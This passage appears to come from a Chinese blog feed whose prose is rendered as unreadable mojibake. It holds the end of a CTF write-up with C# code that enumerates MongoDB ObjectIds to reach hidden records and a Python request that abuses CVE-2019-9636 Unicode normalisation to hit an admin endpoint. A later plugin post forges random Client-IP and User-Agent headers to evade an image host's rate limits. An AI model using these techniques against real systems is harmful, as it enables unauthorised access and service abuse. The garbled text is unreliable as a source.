class="line">shkCTF&#123;0h_N0_Y0U_H4V3_4N_0P3N_SYNF0NY_D3V_M0D3_1787a60ce7970e2273f7df8d11618475&#125;</span><br></pre></td></tr></table></figure><h3 id="Containment-Forever"><a href="#Containment-Forever" class="headerlink" title="Containment Forever"></a>Containment Forever</h3><p>è¿™é¢˜çš„ä¸¤æ¡ flag æ²¡åŠæ³•æ‰“å¼€ï¼Œä½†æ˜¯æœ‰å…¶ä»–è®°å½•å¯ä»¥è®¿é—®ã€‚æ ¹æ®åœ°å€çŒœæµ‹åº”è¯¥æ˜¯è¦è‡ªå·±æ‰¾åˆ°è¿™ä¸ªç±»ä¼¼äº ID çš„ä¸œè¥¿ã€‚äºæ˜¯å°è¯•éšä¾¿æ”¹ä¸€æ³¢ï¼Œå‘ç°æŠ¥é”™äº†ä¸”æ‰¾åˆ°äº† <code>mongoose</code> çš„å­—æ ·ã€‚åœ¨å¤§ä½¬çš„æŒ‡å¼•ä¸‹æ‰¾åˆ°äº† <a href="https://docs.mongodb.com/manual/reference/method/ObjectId/">å‚è€ƒ</a>ï¼Œäºæ˜¯å¼€å§‹æŠŠé¡µé¢ä¸ŠåŸæ¥çš„ ID æ‹†å¼€ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> [] items = &#123;</span><br><span class="line">                <span class="string">&quot;5e70da94d7b1600013655bb5&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e7e4f48d7b1600013655bb9&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e83642bd7b1600013655bba&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e8ee635d7b1600013655bbd&quot;</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">                <span class="built_in">decimal</span>[] parts = <span class="keyword">new</span> <span class="built_in">decimal</span>[<span class="number">3</span>];</span><br><span class="line">                parts[<span class="number">0</span>] = Convert.ToInt64(items[i].Substring(<span class="number">0</span>, <span class="number">8</span>),<span class="number">16</span>);</span><br><span class="line">                parts[<span class="number">1</span>] = Convert.ToInt64(items[i].Substring(<span class="number">8</span>, <span class="number">10</span>),<span class="number">16</span>);</span><br><span class="line">                parts[<span class="number">2</span>] = Convert.ToInt64(items[i].Substring(<span class="number">17</span>, <span class="number">7</span>),<span class="number">16</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;TimeStamp:<span class="subst">&#123;parts[<span class="number">0</span>]&#125;</span>\nRandomValue:<span class="subst">&#123;parts[<span class="number">1</span>]&#125;</span>\nIncrementingCounter:<span class="subst">&#123;parts[<span class="number">2</span>]&#125;</span>\n&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°éšæœºæ•°æ˜¯å›ºå®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´åªéœ€è¦æ—¶é—´æˆ³å’Œ IDã€‚æ—¶é—´æˆ³åªéœ€è¦ä»ä¸¤æ¡è®°å½•ä¸Šæ‰¾ç„¶åè½¬æ¢ä¸€ä¸‹ï¼Œå¾ˆå®¹æ˜“å¾—åˆ°ã€‚</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020-03-21 09:13:22  1584782002</span><br><span class="line">2020-04-13 15:50:18  1586793018</span><br></pre></td></tr></table></figure><p>è‡³äº ID çš„è¯åªéœ€è¦æ ¹æ®å·²ç»æœ‰çš„ ID åœ¨é™„è¿‘æšä¸¾ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚äºæ˜¯å†™æ®µä»£ç ç”Ÿæˆä¸€ä¸‹ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Int64[] timeStamps = &#123;<span class="number">1584782002</span>, <span class="number">1586793018</span>&#125;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> j = <span class="number">56974256</span>; j &lt; <span class="number">56974275</span>; j++)&#123;</span><br><span class="line">                <span class="built_in">string</span> [] deParts = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">3</span>];</span><br><span class="line">                deParts[<span class="number">0</span>] = Convert.ToString(timeStamps[<span class="number">1</span>],<span class="number">16</span>);</span><br><span class="line">                deParts[<span class="number">1</span>] = Convert.ToString(<span class="number">926393827347</span>, <span class="number">16</span>);</span><br><span class="line">                deParts[<span class="number">2</span>] = Convert.ToString(j, <span class="number">16</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;deParts[<span class="number">0</span>]&#125;</span><span class="subst">&#123;deParts[<span class="number">1</span>]&#125;</span><span class="subst">&#123;deParts[<span class="number">2</span>].Substring(<span class="number">1</span>,<span class="number">6</span>)&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„å‡ ä¸ªç»“æœé€ä¸€å°è¯•å¯ä»¥å¾—åˆ°åŒ…å« flag çš„ä¸¤ä¸ªè®°å½•çš„åœ°å€ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;item&#x2F;5e75dab2d7b1600013655bb8</span><br><span class="line">...&#x2F;item&#x2F;5e948a3ad7b1600013655bbf</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„ flag æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;IDOR_IS_ALS0_P0SSIBLE_W1TH_CUST0M_ID!_f878b1c38e20617a8fbd20d97524a515&#125;</span><br></pre></td></tr></table></figure><h3 id="Aqua-World"><a href="#Aqua-World" class="headerlink" title="Aqua World"></a>Aqua World</h3><p>æ‰“å¼€é¡µé¢ï¼Œå‘ç°å¯¼èˆªæœ‰ä¸ªç‚¹ä¸åŠ¨çš„åœ°æ–¹ï¼Œå®¡æŸ¥å…ƒç´ è®¿é—®åˆ° <code>.../admin-query?flag=flag</code>ã€‚é¡µé¢æç¤ºéœ€è¦ä¿®æ”¹ netloc ä¸ºæœ¬åœ°ã€‚åœ¨å„ç§ä¿®æ”¹ header ä¹‹åçœ‹åˆ°äº†é¢˜ç›®ç»™çš„ hintï¼š<code>WTF this PYTHON version is deprecated!!!</code>ã€‚äºæ˜¯é¡ºç€çº¿ç´¢æ‰¾åˆ°äº† <a href="https://bugs.python.org/issue36216">CVE-2019-9636</a> å¹¶æ ¹æ®å…¶ä¸­ç»™å‡ºçš„ä¾‹å­æ„é€ ï¼ˆAuthorization çš„ header æ˜¯é¢˜ç›®æœ¬èº«è¦æ±‚çš„ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span> : <span class="string">&quot;Basic YW5vbnltb3VzOmFub255bW91cw==&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(<span class="string">&quot;.../admin-query\uFF03@127.0.0.1?flag=flag&quot;</span>,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ‰§è¡Œè„šæœ¬çš„ Python ä¹Ÿéœ€è¦ä½¿ç”¨æœ‰æ¼æ´çš„ç‰ˆæœ¬ï¼Œå¦åˆ™è¯·æ±‚æ— æ³•æˆåŠŸå®Œæˆã€‚ï¼ˆè¿™éƒ¨åˆ†è¿˜éœ€è¦å¤ç°</p><p>ä½¿ç”¨ç‰¹å®šç‰ˆæœ¬å‘èµ·è¯·æ±‚åå³å¯åœ¨å“åº”ä¸­æ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;NFKC_normalization_can_be_dangerous!_8471b9b2da83011a07efc2899819da65&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Typoraå›¾åºŠæ’ä»¶è®°</title>
      <link href="/zh-CN/posts/f4f59164.html"/>
      <url>/zh-CN/posts/f4f59164.html</url>
      
        <content type="html"><![CDATA[<p><span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Note</span><span style="font-size: 0.85rem">æ­¤æ–‡ç« ç”± LemonPrefect åŸºäº <a href="https://creativecommons.org/publicdomain/zero/1.0/deed.zh">Creative Commons - CC0 International</a> åè®®å‘å¸ƒï¼Œæ‰€æœ‰å†…å®¹ä»…é™äºå­¦ä¹ äº¤æµã€‚</span></span></p><p>ç”¨ jsDelivr åšå›¾åºŠè›®ä¹…äº†ï¼Œä½†æ˜¯æ¯æ¬¡æ›´æ–°å›¾ç‰‡éƒ½è¦ releaseã€‚å¥½åƒè¦åå¤å ç”¨ç©ºé—´ï¼Œè¿™æ ·è–…å¤šäº†ä¸å¤ªå¥½ï¼Œæ‰€ä»¥å°±ç»“åˆæœ€è¿‘åœ¨ v2ex ä¸Šçœ‹åˆ°çš„ä¸€ä¸ªæ¥å£ï¼Œç»™ Typora å†™äº†ä¸ªä¸Šä¼ æ’ä»¶ã€‚ï¼ˆå…¶å®å¯ä»¥ç”¨ SMMS çš„æœåŠ¡ï¼Œä½†æ˜¯æˆ‘è§‰å¾—æœ‰ç‚¹æ…¢ï¼‰</p><p><escape><span id="more"></span></escape></p><p><span style="color: #0078d7">æ–‡ç« çš„å†…å®¹æ›´æ–°å•¦ï¼å› ä¸ºæ¢äº†æ¥å£ï¼Œæ‰€ä»¥å»ºè®®è·³è¿‡åé¢ BUG ä¿®å¤çš„éƒ¨åˆ†ï¼Œæˆ–è€…ä»…ä½œä¸ºä¸¥è°¨æ€§å‚è€ƒï¼ˆè™½ç„¶æœ¬èº«ä¹Ÿä¸ä¸¥è°¨ï¼‰</span></p><p><span style="color: #0078d7">æ­¤æ–‡æ¡£æœ€åæ›´æ–°äºå¾ˆå¤šå¤©ä»¥å‰ï¼Œå…¶ä¸­çš„æŸäº›æ–¹æ³•å·²ç»å¤±æ•ˆå•¦ï¼ˆå…¶å®è°ƒæ•´ä¸€ä¸‹å°±å¥½äº†ï¼Œä½†æ¯•ç«Ÿæ˜¯å­¦ä¹ ç ”ç©¶ï¼Œå°±ä¸æ”¾å‡ºæ¥å•¦ï¼ˆè‡ªå·±è¯•è¯•çœ‹å§ï¼ˆé€ƒx</span></p><h3 id="è¯»-API-æ–‡æ¡£"><a href="#è¯»-API-æ–‡æ¡£" class="headerlink" title="è¯» API æ–‡æ¡£"></a>è¯» API æ–‡æ¡£</h3><p>é¡ºç€ v2ex çš„ä½œè€…çš„ç«™ç‚¹ï¼Œæˆ‘æ‰¾åˆ°äº† API æä¾›æ–¹å’Œç›¸å…³çš„æ–‡æ¡£ï¼Œç›¸å…³æ‘˜è¦å¦‚ä¸‹ï¼ˆä¸ºäº†æ›´å¥½ç†è§£åšäº†éƒ¨åˆ†ä¿®æ”¹ï¼‰ã€‚</p><table><thead><tr><th align="left">å‚æ•°åç§°</th><th align="left">å¿…å¡«</th><th align="left">ç±»å‹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">imgurl</td><td align="left">å¦</td><td align="left">string</td><td align="left">å›¾ç‰‡é“¾æ¥ä¸Šä¼ åœ°å€</td></tr><tr><td align="left">file</td><td align="left">æ˜¯</td><td align="left">string</td><td align="left">æ–‡ä»¶æµä¸Šä¼ æ–¹å¼ å¿…é¡»ä¸ºâ€œmultipartâ€</td></tr><tr><td align="left">Filedata</td><td align="left">æ˜¯</td><td align="left">string</td><td align="left">æ–‡ä»¶æµ</td></tr></tbody></table><p>æ¥ä¸‹æ¥å°±æ˜¯ Typora æ–¹é¢å¯¹äºå›¾ç‰‡ä¸Šä¼ æ’ä»¶çš„è¦æ±‚ï¼ˆç›¸å…³è¦ç‚¹ç”¨é«˜äº®æ ‡å‡ºï¼‰ã€‚</p><p>You could config a custom command to upload images, using tools that is not listed in above options, or event write your own tools / scripts. Typora will append all images that needs to be uploaded after the custom command you filled.</p><p>Then, Typora will <span class="HighlightWKT7BlueGreen">fetch image urls from the last N lines</span> of the standard output of your custom command. (N is the number of images to upload).</p><p>For example, if you write a tool <code>upload-image.sh</code>, then you can input <code>[some path]/upload-image.sh</code> in the command filed. <span class="HighlightWKT7BlueGreen">Typora will call <code>[some path]/upload-image.sh &quot;image-path-1&quot; &quot;image-path-2&quot;</code> to upload two images located in <code>image-path-1</code> and <code>image-path-2</code>.</span> Then the command may return something like:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Upload Success:</span><br><span class="line">http:&#x2F;&#x2F;remote-image-1.png</span><br><span class="line">http:&#x2F;&#x2F;remote-image-2.png</span><br></pre></td></tr></table></figure><p>Then Typora will get the two remote image url from the output, and replace the original local images used in the Markdown document.</p><p>ä¸»è¦å°±æ˜¯ä¸Šä¼ å›¾ç‰‡ç„¶åä¾æ¬¡è¾“å‡ºåœ°å€ä»¥ä¾›å¼•ç”¨ã€‚ï¼ˆæ²¡çœ‹åˆ°æŠ¥é”™æ€ä¹ˆå®šä¹‰ï¼Œæ‰€ä»¥åé¢å°±éšä¾¿å†™äº†ï¼‰</p><h3 id="å¿«é€Ÿå¼€å‘ä¸è¸©å‘è®°å½•"><a href="#å¿«é€Ÿå¼€å‘ä¸è¸©å‘è®°å½•" class="headerlink" title="å¿«é€Ÿå¼€å‘ä¸è¸©å‘è®°å½•"></a>å¿«é€Ÿå¼€å‘ä¸è¸©å‘è®°å½•</h3><p>æ—¢ç„¶éœ€è¦ç”¨å¯æ‰§è¡Œçš„ï¼Œä¹Ÿå°± Poweshell å’Œ C# è¿˜æœ‰ C/C++ ç¼–è¯‘å‡ºçš„æ–‡ä»¶å¯ä»¥è¿™æ ·æ‰§è¡Œäº†å§ã€‚ï¼ˆä¹Ÿä¸ä¸€å®šï¼‰äºæ˜¯å°±æƒ³ç€ç”¨ C# å†™ä¸€ä¸ªç®€å•çš„ exeï¼Œå› ä¸º C# ä¸Šå°±å¯ä»¥ç”¨æˆ‘å¾ˆå–œæ¬¢çš„ <a href="http://flurl.dev/">Flurl</a> äº†ã€‚</p><p>å®‰è£…å¥½åº“ä¹‹åå°±å¼€å§‹é¢å‘æ–‡æ¡£å†™è¯·æ±‚äº†ï¼Œä½†æ˜¯ Flurl ç½‘ç«™ä¸Šç»™çš„æ–‡æ¡£ä¸å¤Ÿå®Œå…¨ï¼Œå¯¼è‡´ç›¸å…³çš„ <code>PostMultipartAsync()</code> æ–¹æ³•ä½¿ç”¨æ–¹æ³•ä¸è¯¦ç»†ã€‚å¥½åœ¨æˆ‘åœ¨ Stack Overflow ä¸Šæ‰¾åˆ°äº†<a href="https://stackoverflow.com/questions/41042591/how-can-i-upload-a-file-and-form-data-using-flurl">ç›¸å…³çš„é—®é¢˜</a>ã€‚è¿™é‡Œè´´ä¸Šç›¸å…³çš„ç”¨æ³•ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> resp = <span class="keyword">await</span> <span class="string">&quot;http://api.com&quot;</span></span><br><span class="line">    .PostMultipartAsync(mp =&gt; mp</span><br><span class="line">        .AddString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;hello!&quot;</span>)                <span class="comment">// individual string</span></span><br><span class="line">        .AddStringParts(<span class="keyword">new</span> &#123;a = <span class="number">1</span>, b = <span class="number">2</span>&#125;)         <span class="comment">// multiple strings</span></span><br><span class="line">        .AddFile(<span class="string">&quot;file1&quot;</span>, path1)                    <span class="comment">// local file path</span></span><br><span class="line">        .AddFile(<span class="string">&quot;file2&quot;</span>, stream, <span class="string">&quot;file.txt&quot;</span>)       <span class="comment">// file stream</span></span><br><span class="line">        .AddJson(<span class="string">&quot;json&quot;</span>, <span class="keyword">new</span> &#123; foo = <span class="string">&quot;x&quot;</span> &#125;)         <span class="comment">// json</span></span><br><span class="line">        .AddUrlEncoded(<span class="string">&quot;urlEnc&quot;</span>, <span class="keyword">new</span> &#123; bar = <span class="string">&quot;y&quot;</span> &#125;) <span class="comment">// URL-encoded   </span></span><br><span class="line">        .Add(content));                             <span class="comment">// any HttpContent</span></span><br></pre></td></tr></table></figure><p>ç»“åˆ Typora çš„â€œæ‰€è§å³æ‰€å¾—â€çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬ä¸éœ€è¦å®ç°å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ“ä½œï¼Œæ¯•ç«Ÿä¸å¤ªå¯èƒ½å­˜åœ¨å¤§é‡å›¾ç‰‡åŒæ—¶å‡†å¤‡ä¸Šä¼ çš„æƒ…å†µï¼ˆå½“ç„¶ç²˜è´´å¤§é‡å›¾ç‰‡é™¤å¤–ï¼‰ï¼ŒTypora å¯ä»¥å¼€å¯ç²˜è´´åå®æ—¶ä¸Šä¼ çš„æ“ä½œï¼Œä¸è¿‡è¿™æ ·å°±ä¸èƒ½ç²˜è´´å«æœ‰éšç§çš„å›¾ç‰‡äº†ï¼Œå› ä¸ºè¿™ä¸ªå›¾åºŠå¥½åƒæ²¡æœ‰ç»™å‡ºåˆ é™¤ç›¸å…³å›¾ç‰‡çš„æ¥å£ã€‚</p><p>æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬åªéœ€è¦æä¾›ä¸¤ä¸ª POST å‚æ•°å³å¯ï¼Œå› æ­¤ï¼Œè¯·æ±‚å¯ä»¥è¿™æ ·æ„é€ ã€‚ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯æ–‡æ¡£ä¸­æœ‰ä¸€ä¸ªå‚æ•°æ˜¯é¦–å­—æ¯å¤§å†™çš„ï¼Œæœ‰ç‚¹ä¸ä¸€æ ·ï¼‰</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uploadRespose = uploadUrl.PostMultipartAsync(data =&gt; </span><br><span class="line">                    data.AddString(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;multipart&quot;</span>)</span><br><span class="line">                        .AddFile(<span class="string">&quot;Filedata&quot;</span>,args[i])</span><br><span class="line">                ).Result;</span><br><span class="line"><span class="built_in">string</span> responseData = uploadRespose.ResponseMessage.Content.ReadAsStringAsync().Result;</span><br></pre></td></tr></table></figure><p>ç„¶åå†ä» response ä¸­å–å‡ºå›¾ç‰‡é“¾æ¥å¹¶æ¬¡åºæ˜¾ç¤ºå³å¯ã€‚è¿™é‡ŒåŠ ä¸Š Typora å®˜æ–¹æ–‡æ¡£ä¸­çš„ <code>Upload Success:</code> ä»¥ç¡®ä¿è·Ÿä¾‹å­ä¸€è‡´ã€‚</p><p>å½“é‡åˆ°ä¸Šä¼ é”™è¯¯çš„æ—¶å€™ï¼ˆcode != 1ï¼‰ï¼Œå¯ä»¥å†æ¬¡ä¸Šä¼ ã€‚ï¼ˆå…·ä½“ä¸Šä¼ é”™è¯¯åŸå› å› ä¸ºæ–‡æ¡£æ²¡å†™å‡ºï¼Œæ‰€ä»¥ä¸æ¸…æ¥šï¼‰å› æ­¤æˆ‘ç®€å•åœ°å£°æ˜äº†ä¸ªæ ‡è®°æ¬¡æ•°ç„¶åé‡è¯•ã€‚åŒç†ï¼Œåœ¨è·å–å“åº”æ—¶ä¹Ÿå¯ä»¥é€šè¿‡åˆ¤æ–­ http code æ¥åˆ¤æ–­ API æ˜¯å¦æœ‰æ­£å¸¸å“åº”ä»¥ç¡®å®šè¦ä¸è¦é‡æ–°ä¸Šä¼ å›¾ç‰‡ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flag == <span class="number">5</span>)&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Error:API Failed to upload for 5 times!&quot;</span>);</span><br><span class="line">Thread.CurrentThread.Abort();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ å®Œæˆåï¼ŒæŠŠå¾—åˆ°çš„é“¾æ¥æ¬¡åºè¾“å‡ºã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; imageQuantity; i++)&#123;</span><br><span class="line">Console.WriteLine(fetchedUrl[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæˆä¹‹åå°†ç¨‹åºç¼–è¯‘å¹¶æ”¾åœ¨å–œæ¬¢çš„ä½ç½®å¹¶é…ç½®å¥½ Typora çš„ä¸Šä¼ ã€‚ï¼ˆæœ‰ç©ºæ ¼çš„ç›®å½•éœ€è¦æŒ‰ <code>dir /x</code> ä¸‹çš„ç›®å½•ç»™å®šï¼Œè­¬å¦‚ <code>X:\PROGRA~2\PicAlicdnForTypora\PicAlicdnForTypora.exe</code>ï¼‰åœ¨ Typora çš„æµ‹è¯•é€šè¿‡åå³å¯æ­£å¸¸ä½¿ç”¨ã€‚</p><h3 id="BUG-ä¿®å¤"><a href="#BUG-ä¿®å¤" class="headerlink" title="BUG ä¿®å¤"></a>BUG ä¿®å¤</h3><h4 id="ä¸Šä¼ è¯·æ±‚æ¬¡æ•°è¿‡å¤šå¯¼è‡´æ— æ³•æˆåŠŸ"><a href="#ä¸Šä¼ è¯·æ±‚æ¬¡æ•°è¿‡å¤šå¯¼è‡´æ— æ³•æˆåŠŸ" class="headerlink" title="ä¸Šä¼ è¯·æ±‚æ¬¡æ•°è¿‡å¤šå¯¼è‡´æ— æ³•æˆåŠŸ"></a>ä¸Šä¼ è¯·æ±‚æ¬¡æ•°è¿‡å¤šå¯¼è‡´æ— æ³•æˆåŠŸ</h4><p>ä¹‹å‰çš„ç¨‹åºæ²¡æœ‰è€ƒè™‘åˆ°ä¸€æ¬¡æ€§ç²˜è´´å¤§é‡å›¾ç‰‡çš„ä¸Šä¼ ï¼Œç»“æœå¯¼è‡´åœ¨è¿›è¡Œç›¸å…³æ“ä½œçš„æ—¶å€™å›¾ç‰‡å‡ ä¹å®Œå…¨æ— æ³•ä¸Šä¼ æˆåŠŸã€‚äºæ˜¯åœ¨è¿™æ¬¡çš„æ›´æ–°ä¸­å¢åŠ äº†ä¸€ç‚¹å°ç­–ç•¥ã€‚</p><p>åœ¨æ¯æ¬¡è¯·æ±‚æ—¶ä»å‡†å¤‡å¥½çš„ User-Agent ä¸­éšæœºæŠ½å–ï¼ŒåŒæ—¶éšæœºç”Ÿæˆ Client-IPï¼Œå°†å…¶äºŒè€…åˆå¹¶åˆ°æ„é€ çš„è¯·æ±‚ä¸­ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uploadRespose = uploadUrl.WithHeaders(<span class="keyword">new</span> &#123;</span><br><span class="line">                    User_Agent = userAgents[randomNum.Next(<span class="number">4</span>)],</span><br><span class="line">                    Client_IP = randomNum.Next(<span class="number">192</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">                &#125;).PostMultipartAsync(data =&gt; </span><br><span class="line">                    data.AddString(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;multipart&quot;</span>)</span><br><span class="line">                        .AddFile(<span class="string">&quot;Filedata&quot;</span>,args[i])</span><br><span class="line">                ).Result;</span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œä½¿ç”¨ <code>Thread.Sleep(300)</code> åœ¨æ¯æ¬¡å¤„ç†å®Œè¯·æ±‚åä½¿çº¿ç¨‹æš‚åœ 300 æ¯«ç§’ã€‚è¿™æ ·å¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢å› ä¸ºä¸Šä¼ è¯·æ±‚è¿‡äºé¢‘ç¹è€Œä¸Šä¼ å¤±è´¥çš„é—®é¢˜ã€‚</p><h4 id="Content-Type-ç¼–ç æŠ¥é”™"><a href="#Content-Type-ç¼–ç æŠ¥é”™" class="headerlink" title="Content-Type ç¼–ç æŠ¥é”™"></a>Content-Type ç¼–ç æŠ¥é”™</h4><p>è¿™ä¸ª BUG æˆ‘æ„Ÿè§‰æ¯”è¾ƒå¥‡æ€ªï¼Œåœ¨è¯·æ±‚çš„å“åº”ä¸­ï¼Œæœ‰ä¸€å®šæ¦‚ç‡ä¼šæŠŠ Content-Type ä¸­çš„ utf-8 è¿”å›æˆ utf8ã€‚ä½†æ˜¯æœ‰çš„æ—¶å€™å´æ˜¯æ­£å¸¸çš„ã€‚å› æ­¤è¿™éœ€è¦ä½¿ç”¨åˆ° .Net 4.6+ çš„ä¸€ä¸ªæ–°ç‰¹æ€§ <code>EncodingProvider</code> å­ç±»ï¼Œç›¸å…³çš„æ–‡æ¡£<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.text.encoding.registerprovider?redirectedfrom=MSDN&view=netframework-4.7.2">åœ¨è¿™é‡Œ</a>ã€‚è¿™ä¸ªæ–°çš„ç‰¹æ€§å…è®¸è‡ªå®šä¹‰ä¸€ä¸ªç¼–ç ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ„å»ºä¸€ä¸ª utf8 çš„ç±»å‹ç„¶åè¿”å› UTF-8 çš„ç¼–ç ç±»å‹ä½¿å¾—è§£æå¯ä»¥æ­£å¸¸è¿›è¡Œã€‚ç›¸å…³å‚è€ƒæ¥è‡ª <a href="https://stackoverflow.com/questions/47711849/unable-to-receive-response-using-restease/47716537#47716537">Stack Overflow</a>ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EquivocalUtf8EncodingProvider</span> : <span class="title">EncodingProvider</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Encoding <span class="title">GetEncoding</span>(<span class="params"><span class="built_in">string</span> name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> name == <span class="string">&quot;utf8&quot;</span> ? Encoding.UTF8 : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Encoding <span class="title">GetEncoding</span>(<span class="params"><span class="built_in">int</span> codepage</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EncodingProvider provider = <span class="keyword">new</span> EquivocalUtf8EncodingProvider();</span><br><span class="line">Encoding.RegisterProvider(provider);</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶ååŒ…å«ä¸­æ–‡æ—¶ä¸Šä¼ å¤±è´¥"><a href="#æ–‡ä»¶ååŒ…å«ä¸­æ–‡æ—¶ä¸Šä¼ å¤±è´¥" class="headerlink" title="æ–‡ä»¶ååŒ…å«ä¸­æ–‡æ—¶ä¸Šä¼ å¤±è´¥"></a>æ–‡ä»¶ååŒ…å«ä¸­æ–‡æ—¶ä¸Šä¼ å¤±è´¥</h4><p>å› ä¸ºä¸€å¼€å§‹æ–‡ä»¶çš„ä¸Šä¼ ä¾èµ–äºæ–‡ä»¶åï¼ˆå…·ä½“è§ä¸Šé¢çš„è¯·æ±‚éƒ¨åˆ†ä»£ç 